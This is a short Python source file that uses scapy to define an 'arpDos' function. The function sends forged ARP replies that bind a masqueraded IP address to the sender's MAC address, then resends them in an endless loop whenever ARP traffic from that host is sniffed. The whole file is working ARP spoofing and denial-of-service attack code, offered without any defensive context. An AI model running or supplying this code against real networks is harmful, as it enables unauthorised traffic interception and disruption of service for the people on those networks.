from scapy.all import *
from scans import *
from capability import * 
import subprocess
#masq_ip: ip we masquerade as.
#masc_mac: Masqueraded mac address
#source_mac: Our mac address
#Dest IP: target ip
#Dest Mac: target mac address
def arpDos(masq_ip, masq_mac, source_mac, dest_ip, dest_mac):
    packet = ARP()
    packet.op = 2
    packet.psrc = masq_ip
    packet.pdst = dest_ip
    packet.hwdst = dest_mac
    packet.hwsrc = source_mac
    send(packet)
    while True:
        send(packet)
        sniff(filter="arp and host " + masq_ip, count=1)

